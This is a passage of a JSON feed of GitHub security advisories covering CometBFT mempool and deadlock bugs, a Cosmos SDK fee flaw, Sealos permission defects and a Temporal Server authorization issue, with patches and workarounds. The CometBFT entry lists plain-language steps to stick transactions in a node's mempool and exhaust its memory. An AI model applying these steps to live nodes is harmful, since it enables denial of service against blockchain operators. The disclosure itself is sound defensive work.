            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. </p>\n<p>Unfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.</p>\n<p>These are the steps to cause the above duplication problem. Everything should happen within one height, that is no <code>FinalizeBlock</code> or <code>BeginBlock</code> ABCI calls should happen while these steps are reproduced:</p>\n<ol>\n<li>send transaction tx1 to the target full node via RPC</li>\n<li>send N more different transactions to the target full node, where N should be higher than the node's configured value for <code>cache_size</code> in <code>config.toml</code></li>\n<li>send transaction tx1 again to the target full node</li>\n</ol>\n<p>One of the copies of tx1 is now <em>stuck</em> in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.</p>\n<p>The above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.</p>\n<p>This problem is present in releases: <code>v0.37.0</code>, and <code>v0.37.1</code>, as well as in <code>v0.34.28</code>, and all previous releases of the CometBFT repo. It will be fixed in releases <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/890\">here</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Increasing the value of <code>cache_size</code> in <code>config.toml</code> makes it very difficult to effectively attack a full node.</li>\n<li>Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">PR</a> that introduced the map to track transactions in the mempool.</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">PR</a> containing the fix.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm\">https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34451\">https://nvd.nist.gov/vuln/detail/CVE-2023-34451</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">https://github.com/cometbft/cometbft/pull/890</a></li>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">https://github.com/tendermint/tendermint/pull/2778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w24w-wp77-qffm\">https://github.com/advisories/GHSA-w24w-wp77-qffm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm",
            "title": "[github.com/cometbft/cometbft] CometBFT may duplicate transactions in the mempool's data structures",
            "date_modified": "2023-07-05T21:34:54.000Z",
            "date_published": "2023-07-05T21:34:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An internal modification to the way struct <code>PeerState</code> is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:</p>\n<ol>\n<li>Via logs<ul>\n<li>Setting the <code>consensus</code> logging module to \"debug\" level (should not happen in production), and</li>\n<li>Setting the log output format to JSON</li>\n</ul>\n</li>\n<li>Via RPC <code>dump_consensus_state</code></li>\n</ol>\n<p>Case 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.</p>\n<p>In case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.</p>\n<p>The theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one <code>PeerState</code> struct. If <code>dump_consensus_state</code> is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different <code>PeerState</code> structs) and the chain will progress again. Then, the same process can be repeated.</p>\n<p>As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first <code>PeerState</code> struct will deadlock, and not the others (RPC <code>dump_consensus_state</code> accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).</p>\n<p>This regression was introduced in versions <code>v0.34.28</code> and <code>v0.37.1</code>, and will be fixed in <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/865\">here</a>, and the corresponding issue is <a href=\"https://github.com/cometbft/cometbft/pull/863\">here</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For case 1 (hitting the deadlock via logs)</p>\n<ul>\n<li>either don't set the log output to \"json\", leave at \"plain\",</li>\n<li>or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.</li>\n</ul>\n<p>For case 2 (hitting the deadlock via RPC <code>dump_consensus_state</code>)</p>\n<ul>\n<li>do not expose <code>dump_consensus_state</code> RPC endpoint to the public internet (e.g., via rules in your nginx setup)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">Issue</a> that introduced the deadlock</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">Issue</a> reporting the bug via logs</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34450\">https://nvd.nist.gov/vuln/detail/CVE-2023-34450</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">https://github.com/cometbft/cometbft/pull/524</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">https://github.com/cometbft/cometbft/pull/863</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/865\">https://github.com/cometbft/cometbft/pull/865</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr",
            "title": "[github.com/cometbft/cometbft] CometBFT PeerState JSON serialization deadlock",
            "date_modified": "2023-07-05T21:33:49.000Z",
            "date_published": "2023-07-05T21:33:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An internal modification to the way struct <code>PeerState</code> is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:</p>\n<ol>\n<li>Via logs<ul>\n<li>Setting the <code>consensus</code> logging module to \"debug\" level (should not happen in production), and</li>\n<li>Setting the log output format to JSON</li>\n</ul>\n</li>\n<li>Via RPC <code>dump_consensus_state</code></li>\n</ol>\n<p>Case 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.</p>\n<p>In case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.</p>\n<p>The theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one <code>PeerState</code> struct. If <code>dump_consensus_state</code> is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different <code>PeerState</code> structs) and the chain will progress again. Then, the same process can be repeated.</p>\n<p>As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first <code>PeerState</code> struct will deadlock, and not the others (RPC <code>dump_consensus_state</code> accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).</p>\n<p>This regression was introduced in versions <code>v0.34.28</code> and <code>v0.37.1</code>, and will be fixed in <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/865\">here</a>, and the corresponding issue is <a href=\"https://github.com/cometbft/cometbft/pull/863\">here</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For case 1 (hitting the deadlock via logs)</p>\n<ul>\n<li>either don't set the log output to \"json\", leave at \"plain\",</li>\n<li>or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.</li>\n</ul>\n<p>For case 2 (hitting the deadlock via RPC <code>dump_consensus_state</code>)</p>\n<ul>\n<li>do not expose <code>dump_consensus_state</code> RPC endpoint to the public internet (e.g., via rules in your nginx setup)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">Issue</a> that introduced the deadlock</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">Issue</a> reporting the bug via logs</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34450\">https://nvd.nist.gov/vuln/detail/CVE-2023-34450</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">https://github.com/cometbft/cometbft/pull/524</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">https://github.com/cometbft/cometbft/pull/863</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/865\">https://github.com/cometbft/cometbft/pull/865</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr",
            "title": "[github.com/cometbft/cometbft] CometBFT PeerState JSON serialization deadlock",
            "date_modified": "2023-07-05T21:33:49.000Z",
            "date_published": "2023-07-05T21:33:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"xcrisis-does-not-charge-constantfee\">x/crisis does not charge ConstantFee</h1>\n<h3 id=\"impact\">Impact</h3>\n<p>If a transaction is sent to the <code>x/crisis</code> module to check an invariant, the ConstantFee parameter of the chain is NOT charged. All versions of the <code>x/crisis</code> module are affected on all versions of the Cosmos SDK.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>x/crisis</code> module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a <code>MsgVerifyInvariant</code> with the name of the invariant. Processing this message takes extra processing power hence a <code>ConstantFee</code> was introduced on the chain that is charged as extra from the reporter for the extra computational work. This is supposed to avert spammers on the chain making nodes do extra computations using this transaction. By not charging the <code>ConstantFee</code>, the transactions related to invariant checking are relatively cheaper compared to the computational need and other transactions.</p>\n<p>That said, the submitter still has to pay the transaction fee to put the transaction on the network, hence using this weakness for spamming is limited by the usual mechanisms.</p>\n<p>Synthetic testing showed up to a 20% increase in CPU usage on a validator node that is spammed by hundreds of <code>MsgVerifyInvariant</code> messages which still makes this an expensive operation to carry out on a live blockchain network.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The <code>ConstantFee</code> charge of the <code>x/crisis</code> module will either be fixed or disabled in an upcoming regular release of the Cosmos SDK.</p>\n<p>The <code>x/crisis</code> module was originally intended to allow chains to halt rather than continue with some unknown behavior in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential <a href=\"https://github.com/osmosis-labs/osmosis/issues/570\">cost of halting increases</a>, chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks.</p>\n<p>The SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.</p>\n<p>Hence, the decision was made that the <code>x/crisis</code> module will be deprecated when new modules take over its responsibilities.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no workaround posted. Validators are advised to leave some extra computing room on their servers for possible spamming scenarios. (This is a good measure in any case.)</p>\n<h3 id=\"references\">References</h3>\n<p>SDK developer epic about invariant checking: <a href=\"https://github.com/cosmos/cosmos-sdk/issues/15706\">https://github.com/cosmos/cosmos-sdk/issues/15706</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc\">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/issues/15706\">https://github.com/cosmos/cosmos-sdk/issues/15706</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w5w5-2882-47pc\">https://github.com/advisories/GHSA-w5w5-2882-47pc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w5w5-2882-47pc",
            "title": "[github.com/cosmos/cosmos-sdk] github.com/cosmos/cosmos-sdk's x/crisis does not charge ConstantFee",
            "date_modified": "2023-06-30T22:23:26.000Z",
            "date_published": "2023-06-30T22:13:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w5w5-2882-47pc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a permission flaw in the Sealos billing system, which allows users to control the recharge resource account. sealos. io/v1/Payment, resulting in the ability to recharge any amount of 1 RMB.</p>\n<h3 id=\"details\">Details</h3>\n<p>The reason is that sealos is in arrears. Egg pain, we can't create a terminal anymore. Let's charge for it:</p>\n<p>Then it was discovered that the charging interface had returned all resource information. Unfortunately, based on previous vulnerability experience, the namespace of this custom resource is still under the current user's control and may have permission to correct it.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>disable by publish</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>sealos public cloud user</li>\n<li>CWE-287 Improper Authentication</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w\">https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36815\">https://nvd.nist.gov/vuln/detail/CVE-2023-36815</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vpxf-q44g-w34w\">https://github.com/advisories/GHSA-vpxf-q44g-w34w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vpxf-q44g-w34w",
            "title": "[github.com/labring/sealos] Sealos billing system permission control defect",
            "date_modified": "2023-07-03T18:38:26.000Z",
            "date_published": "2023-06-30T20:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vpxf-q44g-w34w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Improper configuration of RBAC permissions resulted in obtaining cluster control permissions, which could control the entire cluster deployed with Sealos, as well as hundreds of pods and other resources within the cluster.</p>\n<h3 id=\"details\">Details</h3>\n<p>detail's is disable by publish.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>detail's is disable by publish.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>sealos public cloud user</li>\n<li>CWE-287 Improper Authentication</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62\">https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-33190\">https://nvd.nist.gov/vuln/detail/CVE-2023-33190</a></li>\n<li><a href=\"https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b\">https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-74j8-w7f9-pp62\">https://github.com/advisories/GHSA-74j8-w7f9-pp62</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-74j8-w7f9-pp62",
            "title": "[github.com/labring/sealos] Improper configuration of RBAC permissions obtaining cluster control permissions",
            "date_modified": "2023-06-30T20:25:53.000Z",
            "date_published": "2023-06-30T20:25:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-74j8-w7f9-pp62"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Insecure defaults in open-source Temporal Server before version 1.20 on all platforms allows an attacker to craft a task token with access to a namespace other than the one specified in the request. Creation of this task token must be done outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task failed or completed.\nIf a task is targeted for completion by the attacker, the targeted namespace must also be using the same data converter configuration as the initial, valid, namespace for the task completion payload to be decoded by workers in the target namespace.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3485\">https://nvd.nist.gov/vuln/detail/CVE-2023-3485</a></li>\n<li><a href=\"https://github.com/temporalio/temporal/releases/tag/v1.20.0\">https://github.com/temporalio/temporal/releases/tag/v1.20.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gm2g-2xr9-pxxj\">https://github.com/advisories/GHSA-gm2g-2xr9-pxxj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gm2g-2xr9-pxxj",
            "title": "[go.temporal.io/server] Temporal Server vulnerable to Incorrect Authorization and Insecure Default Initialization of Resource",
            "date_modified": "2023-06-30T20:25:38.000Z",
            "date_published": "2023-06-30T18:31:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gm2g-2xr9-pxxj"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}